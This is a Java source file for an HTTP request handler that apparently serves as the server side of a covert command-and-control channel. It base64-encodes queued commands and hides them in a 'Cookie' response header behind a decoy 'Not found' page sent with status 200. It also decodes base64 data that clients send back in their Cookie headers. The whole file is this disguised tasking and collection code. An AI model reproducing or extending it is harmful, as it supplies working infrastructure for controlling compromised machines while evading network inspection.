package com.revsni.server.http;

import java.io.IOException;

import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.HttpException;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.protocol.HttpContext;
import org.apache.http.protocol.HttpRequestHandler;

import java.util.ArrayList;
import java.util.List;

import org.apache.commons.codec.binary.Base64;

public class HTTPHandler implements HttpRequestHandler {
    private List<String> commands = new ArrayList<>();
    private volatile String answerCommands;

    protected static final StringEntity http404 = new StringEntity("<html><body><h1>Not found</h1></body></html>", ContentType.create("text/html", "UTF-8"));

    public HTTPHandler() {
        super();
    }

    public void addCommand(String command) {
        commands.add(command);
    } 

    public void setCommandsOnline() {
        String respo = "";
        for(String command : this.commands) {
            respo += command;
            respo += ";";
        }
        System.out.println(respo);
        answerCommands = new String(Base64.encodeBase64String(respo.getBytes()));
        System.out.println(answerCommands);
    }

    @Override
    public void handle(HttpRequest request, HttpResponse response, HttpContext context) throws HttpException, IOException {
        String msg = "";
        String cookie = "";
        if(request.getRequestLine().getMethod().toUpperCase().contains("GET")) {
            if(request.getHeaders("Cookie") != null) {
                cookie = request.getHeaders("Cookie")[0].getValue();
                msg = new String(Base64.decodeBase64(cookie.getBytes()));
            }
        }
        System.out.println(msg);
        response.setStatusCode(200);
        response.setEntity(http404);
        response.setHeader("Cookie", answerCommands);
        
    }
    
}